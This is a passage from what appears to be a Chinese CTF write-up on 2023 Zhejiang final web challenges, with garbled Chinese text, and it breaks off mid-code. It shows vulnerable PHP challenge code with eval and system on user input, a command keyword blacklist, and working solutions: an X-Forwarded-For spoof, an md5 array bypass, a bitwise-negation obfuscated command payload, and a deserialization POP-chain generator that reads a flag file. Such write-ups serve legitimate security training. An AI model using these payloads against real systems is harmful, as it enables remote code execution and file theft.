class="hljs-number">96</span>%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%BB%CF%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%B8%B9%<span class="hljs-number">8</span>A%A5%B8%<span class="hljs-number">87</span>%<span class="hljs-number">93</span>%A8%<span class="hljs-number">85</span>%B9%<span class="hljs-number">9</span>B%B0%<span class="hljs-number">88</span>%CF%B4%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%B5%B7%B5%<span class="hljs-number">90</span>%B6%BC%AD%CC%<span class="hljs-number">9</span>E%BC%BD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%B8%A9%<span class="hljs-number">8</span>A%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">86</span>%A7%CD%AD%CE%<span class="hljs-number">9</span>D%A7%BE%<span class="hljs-number">90</span>%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CA%B1%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%B6%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%B9%<span class="hljs-number">87</span>%<span class="hljs-number">8</span>A%B6%<span class="hljs-number">95</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">92</span>%A5%CC%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">93</span>%CF%A5%AC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>B%CD%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B5%CC%<span class="hljs-number">94</span>%<span class="hljs-number">91</span>%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">98</span>%CF%B4%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AE%C6%A5%<span class="hljs-number">91</span>%B5%<span class="hljs-number">93</span>%A6%A8%AE%<span class="hljs-number">90</span>%B5%B7%B5%<span class="hljs-number">90</span>%B3%BB%B6%<span class="hljs-number">88</span>%B1%BB%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>F%B0%<span class="hljs-number">88</span>%CF%B4%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%<span class="hljs-number">96</span>%CB%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CF%B0%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%B6%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%AB%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%B9%<span class="hljs-number">87</span>%<span class="hljs-number">8</span>A%B6%<span class="hljs-number">95</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BB%CF%<span class="hljs-number">96</span>%A7%BC%AD%CD%A6%A8%<span class="hljs-number">87</span>%CE%A5%AB%CF%<span class="hljs-number">96</span>%B3%<span class="hljs-number">91</span>%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A8%CF%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>C%CC%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>B%B8%C6%<span class="hljs-number">8</span>D%B4%BC%AD%<span class="hljs-number">86</span>%A5%A8%B9%<span class="hljs-number">94</span>%B3%BC%B6%<span class="hljs-number">98</span>%AF%AC%B6%<span class="hljs-number">8</span>F%B4%AC%CB%<span class="hljs-number">91</span>%B0%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>C%C8%BB%AE%<span class="hljs-number">90</span>%B1%BC%<span class="hljs-number">92</span>%A9%<span class="hljs-number">95</span>%<span class="hljs-number">9</span>E%B8%C7%<span class="hljs-number">98</span>%B5%B8%C6%<span class="hljs-number">88</span>%B3%<span class="hljs-number">96</span>%B5%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>D%<span class="hljs-number">96</span>%B6%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">8</span>C%B4%BC%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%AD%CD%A6%A8%<span class="hljs-number">87</span>%CE%A5%AC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B3%<span class="hljs-number">96</span>%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%A5%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A7%AD%<span class="hljs-number">93</span>%B4%BC%AD%CC%<span class="hljs-number">9</span>E%BC%<span class="hljs-number">87</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CD%A6%A8%<span class="hljs-number">88</span>%<span class="hljs-number">90</span>%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%B4%AC%CA%AE%AC%B9%BD%<span class="hljs-number">99</span>%AD%AA%C6%B2%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">8</span>F%AF%AB%BE%C8%BB%AE%<span class="hljs-number">8</span>F%CC%<span class="hljs-number">9</span>E%B8%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C%A5%AC%BE%<span class="hljs-number">90</span>%B5%B8%<span class="hljs-number">94</span>%C7%B2%<span class="hljs-number">95</span>%BE%<span class="hljs-number">88</span>%B4%A7%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CF%B0%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%B5%B8%<span class="hljs-number">94</span>%C9%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AD%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>D%<span class="hljs-number">96</span>%B6%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%B5%B8%C6%<span class="hljs-number">88</span>%AF%AC%B5%<span class="hljs-number">9</span>C%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%AF%AC%B6%<span class="hljs-number">8</span>A%<span class="hljs-number">9</span>B%B7%B5%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>D%AC%<span class="hljs-number">97</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CF%<span class="hljs-number">9</span>D%CD%<span class="hljs-number">8</span>C%<span class="hljs-number">90</span>%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AE%<span class="hljs-number">8</span>C%B6%<span class="hljs-number">96</span>%BE%C6%B6%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>F%B3%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>C%C8%B5%<span class="hljs-number">85</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%B6%BC%BE%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">8</span>C%B4%BC%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%A5%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A7%AD%<span class="hljs-number">93</span>%B4%BC%AD%CC%<span class="hljs-number">9</span>E%BC%<span class="hljs-number">87</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CD%A6%A8%<span class="hljs-number">88</span>%<span class="hljs-number">90</span>%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%B4%AC%CA%AE%AC%B9%BD%<span class="hljs-number">99</span>%AD%AA%C6%B2%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%AC%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>D%B0%<span class="hljs-number">88</span>%CF%B4%<span class="hljs-number">99</span>%AE%CF%B4%DD%DF%<span class="hljs-number">83</span>%DF%<span class="hljs-number">9</span>D%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%C9%CB%DF%D2%<span class="hljs-number">9</span>B%DF%C1%DF%D0%<span class="hljs-number">8</span>B%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%D0%<span class="hljs-number">9</span>E%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%D6%DF%D9%D9%DF%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%D0%<span class="hljs-number">8</span>B%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%D0%<span class="hljs-number">9</span>E%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023zhejiang-4.png"></p>
<h2 id="å†³èµ›-baby-md5"><a href="#å†³èµ›-baby-md5" class="headerlink" title="å†³èµ›[baby md5]"></a>å†³èµ›[baby md5]</h2><p>check.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isRequestFromLocal</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// å®šä¹‰æœ¬åœ°IPåœ°å€</span><br>    <span class="hljs-variable">$localIP</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><br>    <span class="hljs-comment">// è·å–å®¢æˆ·ç«¯IPåœ°å€</span><br>    <span class="hljs-variable">$clientIP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br><br>    <span class="hljs-comment">// æ¯”è¾ƒå®¢æˆ·ç«¯IPåœ°å€ä¸æœ¬åœ°IPåœ°å€</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$clientIP</span> === <span class="hljs-variable">$localIP</span>) &#123;<br>        <span class="hljs-comment">// è¯·æ±‚æ¥è‡ªæœ¬åœ°</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// è¯·æ±‚ä¸æ¥è‡ªæœ¬åœ°</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;check.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isRequestFromLocal</span>()) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello!&#x27;</span>;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/eval|shell_exec|system|proc_open|popen|pcntl_exec|\&#x27;|cat|include|whoami/i&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$c</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Oh no, you are hacker!!!&#x27;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;failed&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ipéªŒè¯ç”¨X-Forwarded-Forï¼Œmd5å¼±æ¯”è¾ƒç”¨æ•°ç»„ç»•è¿‡ï¼Œæ­£åˆ™åŒ¹é…ç”¨å–åç»•è¿‡</p>
<p>payloadï¼š<code>X-Forwarded-For=127.0.0.1</code>,<code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);&amp;key1[]=1&amp;key2[]=2</code></p>
<p><img src="/img/wp/2023/2023zhejiang-5.png"></p>
<h2 id="å†³èµ›-easy-serialize"><a href="#å†³èµ›-easy-serialize" class="headerlink" title="å†³èµ›[easy serialize]"></a>å†³èµ›[easy serialize]</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in /flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">learn</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAge</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;var2-&gt;var3;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAge</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">young</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">old</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Okay, you get the key, but we send you &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç»™å®šäº†flagä½ç½®ï¼ŒåŒæ—¶åˆæœ‰<code>file_get_contents</code>,é‚£ä¹ˆå°±ä»learnå‡½æ•°å…¥æ‰‹ã€‚å¾ˆæ˜æ˜¾<code>__invoke</code>è°ƒç”¨äº†<code>learn</code>ï¼Œä¼ è¿›å»äº†å¯æ§çš„<code>$var</code>ï¼Œè€Œåœ¨<code>yong::__tostring</code>ä¸­å¯ä»¥è§¦å‘<code>baby::__invoke</code>ï¼Œ<code>old::__get</code>ä¸­å¯ä»¥è§¦å‘<code>yong::__tostring</code>ï¼Œbabyä¸­çš„getAgeåˆèƒ½è§¦å‘<code>old::__get</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;/flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">learn</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAge</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;var2-&gt;var3;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAge</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">young</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">old</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Okay, you get the key, but we send you &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">baby</span>();<br><span class="hljs-variable">$a</span>-&gt;var2 = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">old</span>();<br><span class="hljs-variable">$a</span>-&gt;var2-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">young</span>();<br><span class="hljs-variable">$a</span>-&gt;var2-&gt;<span class="hljs-keyword">var</span>-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">baby</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>


<h2 id="å†³èµ›-p2rce"><a href="#å†³èµ›-p2rce" class="headerlink" title="å†³èµ›[p2rce]"></a>å†³èµ›[p2rce]</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a === <span class="hljs-variable language_">$this</span>-&gt;b) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;b) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;b)) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;br/&gt;get it!!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$flag</span>);<br>    <span 